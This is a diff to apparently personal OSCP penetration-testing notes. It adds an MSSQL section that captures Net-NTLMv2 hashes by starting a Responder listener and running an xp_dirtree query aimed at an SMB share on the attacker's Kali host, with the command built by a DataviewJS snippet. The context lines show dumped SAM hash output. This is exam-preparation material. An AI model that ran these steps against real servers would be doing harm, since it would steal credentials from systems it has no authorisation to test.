@@ -81,5 +81,26 @@ Admin:1005:aad3b435b51404eeaad3b435b51404ee:9035fa4c490df7a171b56b881c410a33:::
 [*] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> Done dumping SAM hashes for host: 192.168.162.159
 ```
 
+---
 
+
+## Port 1433 : MSSQL Database
+### Get Net-NTLMv2
+
+Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener
+
+Open Listener
+```
+sudo responder -I tun0 -dwv
+```
+
+In MSSQL database query
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 
